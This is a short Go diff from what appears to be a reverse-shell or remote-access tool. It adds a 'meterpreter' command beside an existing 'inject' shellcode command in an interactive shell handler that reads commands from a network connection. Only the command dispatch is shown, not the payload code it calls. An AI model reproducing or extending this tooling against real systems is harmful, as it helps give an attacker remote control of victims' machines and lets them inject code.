@@ -39,6 +39,10 @@ func InteractiveShell(conn net.Conn) {
 		if len(command) > 1 {
 			argv := strings.Split(command, " ")
 			switch argv[0] {
+			case "meterpreter":
+				if len(argv) > 1 {
+					shell.Meterpreter(argv[1])
+				}
 			case "inject":
 				if len(argv) > 1 {
 					shell.InjectShellcode(argv[1])
